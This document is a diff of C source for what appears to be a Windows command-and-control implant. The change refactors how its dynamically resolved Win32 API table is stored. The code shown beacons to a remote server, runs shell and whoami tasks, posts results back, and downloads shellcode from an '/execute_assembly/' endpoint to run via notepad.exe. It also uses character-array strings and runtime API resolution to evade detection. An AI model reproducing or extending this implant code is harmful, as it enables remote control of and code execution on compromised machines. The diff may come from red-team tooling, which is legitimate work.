@@ -17,9 +17,6 @@
 #define UUID_M '1','1','e','3','b','2','7','c','-','a','1','e','7','-','4','2','2','4','-','b','4','d','9','-','3','a','f','3','6','f','a','2','f','0','d','0',0
 #endif
 
-static API Api = {0};
-static PAPI api = &Api;
-
 /**
  * @fn Agent* AgentAllocate
  *
@@ -56,8 +53,6 @@ Agent* AgentAllocate(MALLOC malloc)
     }
     */
 
-    agent->_magic = AGENT_MAGIC;
-
     return agent;
 }
 
@@ -72,7 +67,6 @@ Agent* AgentAllocate(MALLOC malloc)
  * @param _In_ CONST SIZE_T remoteServerLength: the length of the `remoteServer` string including the null terminator
  * @param _In_ CONST INTERNET_PORT remotePort: the server port to connect to
  * @param _In_ CONST AGENT_INTERVAL interval: the interval in between server callbacks
- * @param _In_ PAPI api interval: the struct that has dynamically imported Win32 api calls
  *
  * @return BOOL: TRUE if population is successful
  *               FALSE if population fails
@@ -87,12 +81,19 @@ Agent* AgentAllocate(MALLOC malloc)
  */
 BOOL AgentPopulate(_In_ Agent* agent, _In_ CONST WCHAR remoteServer[AGENT_REMOTE_SERVER_MAX_LENGTH], _In_ CONST SIZE_T remoteServerLength, _In_ CONST INTERNET_PORT remotePort, _In_ CONST AGENT_INTERVAL interval)
 {
-    populate_api();
-
+    /* DEBUG_PRINTF_ERROR doesn't work before populating the api member of Agent
     // if agent pointer is NULL, exit
     if (agent == NULL)
     {
         DEBUG_PRINTF_ERROR("%s", "AgentPopulate: agent is NULL\n");
+        return FALSE;
+    }
+    */
+
+    // Set the api first so that things that depend on it such as DEBUG_PRINTF_ERROR works
+    if (AgentApiSet(agent) == FALSE)
+    {
+        //DEBUG_PRINTF_ERROR("%s", "AgentPopulate: AgentApiSet failed\n");
         return FALSE;
     }
 
@@ -131,12 +132,6 @@ BOOL AgentPopulate(_In_ Agent* agent, _In_ CONST WCHAR remoteServer[AGENT_REMOTE
         return FALSE;
     }
 
-    if (AgentApiSet(agent) == FALSE)
-    {
-        DEBUG_PRINTF_ERROR("%s", "AgentPopulate: AgentApiSet failed\n");
-        return FALSE;
-    }
-
     return TRUE;
 }
 
@@ -160,12 +155,12 @@ BOOL AgentPopulate(_In_ Agent* agent, _In_ CONST WCHAR remoteServer[AGENT_REMOTE
  */
 BOOL AgentFree(_In_ Agent* agent)
 {
-    if (agent->api == NULL || agent->api->malloc == 0) {
-        DEBUG_PRINTF_ERROR("%s", "agent->api->malloc or agent->api is null or 0\n");
+    if (agent->api.malloc == 0) {
+        DEBUG_PRINTF_ERROR("%s", "agent->api.malloc is 0\n");
         return FALSE;
     }
 
-    ((FREE)agent->api->free)(agent);
+    ((FREE)agent->api.free)(agent);
 
     return TRUE;
 }
@@ -340,25 +335,31 @@ BOOL AgentIntervalSet(_Inout_ Agent* agent, _In_ AGENT_INTERVAL interval)
  */
 BOOL AgentApiSet(_Out_ Agent* agent)
 {
+    /* Debugs don't work without populating the api first
     if (agent == NULL)
     {
         DEBUG_PRINTF_ERROR("%s", "AgentApiSet: agent is NULL\n");
         return FALSE;
     }
+    */
 
+    /*
     if (agent->_magic != AGENT_MAGIC)
     {
         DEBUG_PRINTF_ERROR("%s", "AgentApiSet: agent is not valid\n");
         return FALSE;
     }
+    */
 
+    /*
     if (api == NULL)
     {
         DEBUG_PRINTF_ERROR("%s", "AgentApiSet: api is NULL\n");
         return FALSE;
     }
+    */
 
-    agent->api = api;
+    agent->api = _populate_api();
 
     return TRUE;
 }
@@ -526,7 +527,7 @@ BOOL AgentExecuteTask(_In_ Agent* agent, _In_ PESG_STD_API pEsgStdApi, _Out_opt_
  */
 BOOL _AgentExecuteCmd(_In_ Agent* agent, _In_ PESG_STD_API pEsgStdApi, _In_ Task task, _Out_ CHAR** taskResult, _Out_ DWORD* pdwSizeOfOutput)
 {
-    if (agent->api == NULL || pEsgStdApi == NULL || taskResult == NULL || pdwSizeOfOutput == NULL) {
+    if (pEsgStdApi == NULL || taskResult == NULL || pdwSizeOfOutput == NULL) {
         DEBUG_PRINTF_ERROR("%s", "_AgentExecuteCmd: Invalid parameters\n");
         return FALSE; // Invalid parameters
     }
@@ -540,9 +541,9 @@ BOOL _AgentExecuteCmd(_In_ Agent* agent, _In_ PESG_STD_API pEsgStdApi, _In_ Task
         return FALSE;
     }
 
-    *taskResult = myTrim(agent->api, orgOutput, '\n');
+    *taskResult = myTrim(&agent->api, orgOutput, '\n');
 
-    ((FREE)agent->api->free)(orgOutput);
+    ((FREE)agent->api.free)(orgOutput);
     orgOutput = NULL;
 
     if (*taskResult == NULL)
@@ -579,7 +580,7 @@ BOOL _AgentExecuteWhoami(_In_ Agent* agent, _In_ PESG_STD_API pEsgStdApi, _In_ T
 {
     *pdwSizeOfOutput = 0;
 
-    if (agent->api == NULL || pEsgStdApi == NULL || taskResult == NULL || pdwSizeOfOutput == NULL) {
+    if (pEsgStdApi == NULL || taskResult == NULL || pdwSizeOfOutput == NULL) {
         DEBUG_PRINTF_ERROR("%s", "_AgentExecuteWhoami: Invalid parameters\n");
         return FALSE; // Invalid parameters
     }
@@ -593,9 +594,9 @@ BOOL _AgentExecuteWhoami(_In_ Agent* agent, _In_ PESG_STD_API pEsgStdApi, _In_ T
         return FALSE;
     }
 
-    *taskResult = myTrim(agent->api, orgOutput, '\n');
+    *taskResult = myTrim(&agent->api, orgOutput, '\n');
 
-    ((FREE)agent->api->free)(orgOutput);
+    ((FREE)agent->api.free)(orgOutput);
     orgOutput = NULL;
 
     if (*taskResult == NULL)
@@ -628,7 +629,7 @@ BOOL _AgentExecuteWhoami(_In_ Agent* agent, _In_ PESG_STD_API pEsgStdApi, _In_ T
  */
 BOOL _AgentExecuteShutdown(_In_ Agent* agent, _Out_ DLL* pEsgStdDll, _In_ Task task)
 {
-    if (agent == NULL || agent->api == NULL || pEsgStdDll == NULL) {
+    if (agent == NULL || pEsgStdDll == NULL) {
         DEBUG_PRINTF_ERROR("%s", "_AgentExecuteShutdown: Invalid parameters\n");
         return FALSE; // Invalid parameters
     }
@@ -659,7 +660,7 @@ BOOL _AgentExecuteShutdown(_In_ Agent* agent, _Out_ DLL* pEsgStdDll, _In_ Task t
     // base64 value of exitSuccess
     CHAR encodedExitOutput[17] = { 'R', 'X', 'h', 'p', 'd', 'F', 'N', '1', 'Y', '2', 'N', 'l', 'c', '3', 'M', '=', 0 };
     totalJsonSize = myStrlenA(jsonFormat)-6 + dwEncodedExitOutputSize-1 + myStrlenA(task.taskId) + myStrlenA(task.agentUuid);
-    json = (CHAR*)((CALLOC)agent->api->calloc)(totalJsonSize, sizeof(CHAR));
+    json = (CHAR*)((CALLOC)agent->api.calloc)(totalJsonSize, sizeof(CHAR));
 
     if (json == NULL)
     {
@@ -667,18 +668,18 @@ BOOL _AgentExecuteShutdown(_In_ Agent* agent, _Out_ DLL* pEsgStdDll, _In_ Task t
         return FALSE;
     }
 
-    ((SNPRINTF)agent->api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.agentUuid, encodedExitOutput);
-    PostRequest(agent->api, agent->_remoteServer, agent->_remotePort, pathSendTaskOutput, json);
+    ((SNPRINTF)agent->api.snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.agentUuid, encodedExitOutput);
+    PostRequest(&agent->api, agent->_remoteServer, agent->_remotePort, pathSendTaskOutput, json);
 
-    ((FREE)agent->api->free)(pEsgStdDll->pBuffer);
+    ((FREE)agent->api.free)(pEsgStdDll->pBuffer);
     pEsgStdDll->pBuffer = NULL;
-    ((FREE)agent->api->free)(json);
+    ((FREE)agent->api.free)(json);
     json = NULL;
-    ((FREE)agent->api->free)(task.taskParams);
+    ((FREE)agent->api.free)(task.taskParams);
     task.taskParams = NULL;
 
     // TODO: Change with ExitProcess
-    ((EXITTHREAD)agent->api->ExitThread)(0);
+    ((EXITTHREAD)agent->api.ExitThread)(0);
     return TRUE;
 }
 
@@ -712,7 +713,7 @@ BOOL _AgentExecuteShutdown(_In_ Agent* agent, _Out_ DLL* pEsgStdDll, _In_ Task t
  */
 BOOL _AgentExecuteAssembly(_In_ Agent* agent, PESG_STD_API pEsgStdApi, CHAR** pTaskResult, DWORD* pdwSizeOfOutput)
 {
-    if (agent == NULL || agent->api == NULL || pEsgStdApi == NULL || pTaskResult == NULL || pdwSizeOfOutput == NULL) {
+    if (agent == NULL || pEsgStdApi == NULL || pTaskResult == NULL || pdwSizeOfOutput == NULL) {
         DEBUG_PRINTF_ERROR("%s", "_AgentExecuteAssembly: Invalid parameters\n");
         return FALSE; // Invalid parameters
     }
@@ -721,7 +722,7 @@ BOOL _AgentExecuteAssembly(_In_ Agent* agent, PESG_STD_API pEsgStdApi, CHAR** pT
     CHAR lpApplicationName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
     DWORD dwShellcodeSize;
     WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
-    LPVOID shellcode = httpGetExecutable(agent->api, &dwShellcodeSize, cAssemblyEndpoint, agent->_remoteServer, agent->_remotePort);
+    LPVOID shellcode = httpGetExecutable(&agent->api, &dwShellcodeSize, cAssemblyEndpoint, agent->_remoteServer, agent->_remotePort);
 
     if (shellcode == NULL)
     {
@@ -735,7 +736,7 @@ BOOL _AgentExecuteAssembly(_In_ Agent* agent, PESG_STD_API pEsgStdApi, CHAR** pT
         return FALSE;
     }
 
-    *pTaskResult = ((CALLOC)agent->api->calloc)(myStrlenA(TASK_EXECUTE_ASSEMBLY)+1, sizeof(CHAR));
+    *pTaskResult = ((CALLOC)agent->api.calloc)(myStrlenA(TASK_EXECUTE_ASSEMBLY)+1, sizeof(CHAR));
 
     if (*pTaskResult == NULL) {
         DEBUG_PRINTF_ERROR("%s", "_AgentExecuteAssembly: calloc for *pTaskResult failed\n");
@@ -747,12 +748,15 @@ BOOL _AgentExecuteAssembly(_In_ Agent* agent, PESG_STD_API pEsgStdApi, CHAR** pT
         *pTaskResult[i] = TASK_EXECUTE_ASSEMBLY[i];
     }
 
-    ((FREE)agent->api->free)(shellcode);
+    ((FREE)agent->api.free)(shellcode);
     return TRUE;
 }
 
-void populate_api()
+API _populate_api()
 {
+    API _api = {0};
+    PAPI api = &_api;
+
     // Library Names
     CHAR user32_c[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0 };
     CHAR winhttp_c[] = { 'w', 'i', 'n', 'h', 't', 't', 'p', 0 };
@@ -762,7 +766,7 @@ void populate_api()
 
     // Library Declarations
     UINT64 kernel32dll, winhttpdll, msvcrtdll, user32dll, crypt32dll, shlwapidll;
- 
+
     // Function Names
     CHAR messageBoxA_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };
     CHAR messageBoxW_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'W', 0 };
@@ -848,10 +852,7 @@ void populate_api()
 
     // shlwapi
     api->StrToIntW = GetSymbolAddress((HANDLE)shlwapidll, StrToIntW_c);
-}
 
-PAPI inject_api()
-{
-    return api;
+    return _api;
 }
 
